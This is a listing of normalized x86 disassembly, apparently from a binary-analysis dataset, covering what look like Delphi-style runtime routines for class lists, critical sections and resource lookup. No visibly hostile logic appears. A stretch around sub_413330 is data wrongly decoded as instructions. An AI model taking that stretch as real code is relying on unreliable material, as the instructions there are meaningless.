test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_40330c
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4127b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413898
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_41282c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
mov eax [ esi + 0x4 ]
call sub_4030f8
mov eax [ esi + 0x8 ]
call sub_4030f8
mov eax [ esi + 0xc ]
call sub_4030f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_41286c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4139f4
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_40305c
test al al
jne r-xdata
sub_4128cc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4139f4
mov edx eax
mov eax ebp
call sub_40330c
test al al
jne r-xdata
sub_412910
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4129ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403048
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404118
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41286c
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4129b2
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
sub_4129d0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404ea8
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4129f0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4139f4
mov edx edi
call sub_4129d0
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4139f4
mov edx edi
call sub_4129d0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4138e4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4129d0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4138e4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412a94
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4139f4
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4128cc
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412ae0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4127b0
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413898
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_412b54
push ebx
push esi
push edi
push ebp
call sub_40346c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403454
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4139f4
call sub_4030f8
inc edi
dec ebp
jne r-xdata
sub_412bb0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4139f4
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412740
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412bf4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_41286c
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4139f4
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412c38
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412cbb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403048
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cc2
lea eax [ ebp - 0x10c ]
call sub_403eb4
retn
sub_412cc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412bb0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4126d4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412c38
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4139f4
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139f4
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40330c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412bb0
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138e4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413898
sub_412db4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139f4
mov edx ebp
call sub_4129b8
test al al
jne r-xdata
sub_412df8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4127b0
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413898
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139f4
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413a50
test eax eax
jge r-xdata
sub_412e54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139f4
mov esi eax
mov edx ebp
mov eax esi
call sub_4129f0
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4030f8
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138e4
sub_412ea4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_412fa3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403404
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412faa
mov eax [ rw-data ]
call sub_412e48
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413898
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4139f4
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4128cc
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413898
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4139f4
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412faa
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_412fd0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_413000
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412d90
xor edx edx
push ebp
push sub_413077
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412e48
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403918
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4139f4
mov edx [ ebp - 0x4 ]
call sub_41286c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413094
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4130f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130fb
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
sub_413100
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_413146
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412bf4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41314d
mov eax [ rw-data ]
call sub_412e48
retn
sub_413154
push ebx
push esi
mov esi eax
mov eax esi
call sub_413100
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_413094
sub_413174
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_4131d9
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412db4
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412d9c
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131e0
mov eax [ rw-data ]
call sub_412e48
retn
mov eax ebx
call sub_403084
mov ebx eax
sub_4131e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_413226
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41322d
mov eax [ rw-data ]
call sub_412e48
retn
sub_413230
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_413272
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412df8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413279
mov eax [ rw-data ]
call sub_412e48
retn
sub_41327c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_4132c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412cc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132ca
mov eax [ rw-data ]
call sub_412e48
retn
sub_4132d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412d90
xor eax eax
push ebp
push sub_41331e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412a94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413325
mov eax [ rw-data ]
call sub_412e48
retn
sub_413330
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
je r-xdata
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x28004010 ] ah
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
call 0x94173a9
push esp
dec ecx
outsb
je r-xdata
push sub_413325
mov eax [ rw-data ]
call sub_412e48
retn
rcl [ ebp - 0x75 ] 0xec
test dl dl
je r-xdata
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413384
mov edx eax
mov eax [ rw-data ]
call sub_413d6c
pop edi
pop esi
pop ebx
retn
outsd
outsb
jae r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax [ rw-data ]
call sub_413df4
mov esi eax
xor edx edx
push ebp
push sub_413452
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax eax
pop ebp
retn 0x8
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
mov edx ebx
mov eax esi
call sub_4139f4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403918
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413384
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403404
pop ebp
retn 0x8
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4133bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413384
mov edx eax
mov eax [ rw-data ]
call sub_413d6c
pop edi
pop esi
pop ebx
retn
sub_4133e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413df4
mov esi eax
xor edx edx
push ebp
push sub_413452
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e58
retn
mov edx ebx
mov eax esi
call sub_4139f4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403918
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413464
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407ab4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4134a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f08
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4134e8
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413a50
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413898
sub_413540
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4139f4
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413580
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413540
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4135a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404374
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416304
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413618
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415e04
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
sub_413628
push ebx
call sub_405c20
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405c20
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413898
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov ebx eax
call sub_405c20
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov ebx eax
call sub_405c20
mov [ eax + 0xc ] ebx
sub_413680
push ebx
push esi
push edi
call sub_405c20
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4139f4
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4136b0
push ebx
push esi
call sub_405c20
mov eax [ eax + 0x8 ]
call sub_4030f8
call sub_405c20
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413adc
mov esi eax
call sub_405c20
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4138e4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405c20
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4030f8
sub_41370c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4137a2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4137a9
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403084
call sub_41370c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403048
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404118
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404ed0
call sub_404f20
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4135a4
or bl al
sub_4137b4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413862
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413843
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403040
call sub_41370c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413628
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41384a
